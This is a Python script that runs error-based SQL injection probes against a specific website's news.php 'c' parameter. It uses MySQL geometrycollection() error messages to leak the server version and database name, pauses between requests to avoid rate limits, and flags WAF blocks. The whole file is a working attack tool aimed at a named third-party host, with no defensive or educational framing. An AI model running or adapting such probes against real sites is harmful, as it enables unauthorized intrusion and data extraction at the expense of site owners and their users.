#!/usr/bin/env python3
"""zagroup: single-request error-based extraction (no blind, avoids rate limit)
geometrycollection showed literal 'version()' - test if evaluated expressions show values
"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def probe(expr, tag):
    # numeric context: c=259 aNd geometrycollection(EXPR)
    param = "259%20aNd%20geometrycollection(" + expr + ")"
    code, body = fetch(BASE + "?c=" + param)
    m = re.search(r"Illegal non geometric '([^']+)' value found", body)
    print("%-30s code=%s %s" % (tag, code, ("DATA: " + m.group(1)[:120]) if m else "size=%d %s" % (len(body), "WAF" if code == 403 else "")), flush=True)
    time.sleep(3)

print("=== geometrycollection eval tests ===")
probe("version()", "version()")
probe("concat(version())", "concat(version())")
probe("concat(version(),'x')", "concat(version,'x')")
probe("(select version())", "(select version())")
probe("database()", "database()")
probe("(select database())", "(select database())")
probe("(select 1)", "(select 1)")
probe("concat((select database()))", "concat(subq)")
probe("concat(1+1)", "concat(1+1)")
probe("concat(0x31)", "concat(hex-1)")
